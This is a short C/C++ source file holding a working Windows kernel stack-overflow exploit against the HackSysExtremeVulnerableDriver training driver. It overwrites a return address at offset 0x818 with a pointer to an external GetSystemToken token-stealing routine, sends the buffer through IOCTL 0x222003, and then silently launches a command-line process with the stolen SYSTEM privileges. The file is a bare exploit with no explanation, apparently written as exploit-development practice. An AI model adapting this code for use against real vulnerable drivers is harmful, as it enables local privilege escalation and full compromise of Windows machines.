#include <stdio.h>
#include <Windows.h>



extern "C" void GetSystemToken();




void main(char* argc, char* argv[])
{
	char Buffer[0x820];
	HANDLE hDevice;
	DWORD dwRet = 0;

	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) {
		printf("[-] GetDriver fail!\n");
		return;
	}
	printf("[+] GetDriver Success!\n");
	printf("[+] Token:%p\n", &GetSystemToken);
	memset(Buffer, 'A', 0x820);
	//INT64 point = (INT64)&GetSystemToken;
	//INT32 High = point >> 32;
	//INT32 Low = point;
	*(PINT64)(Buffer + 0x818) = (INT64)&GetSystemToken;
	//*(PINT32)(Buffer + 0x820) = (INT32)&GetSystemToken;
	DeviceIoControl(hDevice, 0x222003, Buffer, 0x820, NULL, 0, &dwRet, 0);
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	if (argv[1])
	{
		si = { 0 };
		pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = 1;
		si.wShowWindow = 0;
		CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, 0x10000);
	}


}